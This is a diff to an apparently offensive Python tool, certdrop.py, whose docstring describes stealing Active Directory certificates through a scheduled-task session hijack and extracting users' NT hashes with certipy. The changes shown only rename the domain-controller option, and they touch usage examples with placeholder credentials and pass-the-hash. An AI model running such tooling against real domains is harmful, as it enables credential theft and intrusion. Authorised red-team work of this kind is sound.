@@ -7,9 +7,9 @@ to request an ADCS certificate, export it as PFX, then runs certipy to
 extract the user's NT hash.
 
 Usage:
-  certdrop.py admin:Pass@TARGET -ca HOST\\CA --dc-ip DC_IP
-  certdrop.py admin@TARGET -H :NTHASH -ca HOST\\CA --dc-ip DC_IP
-  certdrop.py domain/admin:Pass@TARGET -ca HOST\\CA --dc-ip DC_IP -k
+  certdrop.py admin:Pass@TARGET -ca HOST\\CA -dc DC_IP
+  certdrop.py admin@TARGET -H :NTHASH -ca HOST\\CA -dc DC_IP
+  certdrop.py domain/admin:Pass@TARGET -ca HOST\\CA -dc DC_IP -k
 """
 
 import argparse
@@ -308,7 +308,7 @@ def resolve_target(target, dc_ip, domain):
             except Exception:
                 pass
         if not ip:
-            die(f"Cannot resolve {hostname}. Check --dc-ip or DNS.")
+            die(f"Cannot resolve {hostname}. Check -dc or DNS.")
         return hostname, ip
 
 
@@ -1278,10 +1278,10 @@ def parse_args():
         description="ADCS cert theft via scheduled task session hijack",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""examples:
-  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1
-  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1 -tu jsmith
-  %(prog)s corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1
-  %(prog)s administrator@10.0.0.5 -H :abc123def -ca 'CA01.corp.local\\Corp-CA' --dc-ip 10.0.0.1
+  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1
+  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1 -tu jsmith
+  %(prog)s corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1
+  %(prog)s administrator@10.0.0.5 -H :abc123def -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1
 """,
     )
     p.add_argument("target", metavar="[[domain/]username[:password]@]target",
@@ -1292,9 +1292,9 @@ def parse_args():
         metavar="[LM:]NT",
         help="NT hash for pass-the-hash")
     auth.add_argument("-k", "--kerberos", action="store_true",
-        help="Use Kerberos authentication (requires --dc-ip)")
-    auth.add_argument("--dc-ip", required=True,
-        help="Domain controller IP (required for certipy auth)")
+        help="Use Kerberos authentication")
+    auth.add_argument("-dc", "--dc-ip", required=True, dest="dc_ip",
+        help="Domain controller IP")
     auth.add_argument("--aes-key", default="",
         help="AES key for Kerberos (128 or 256 bits hex)")
     auth.add_argument("--port", type=int, default=5985,
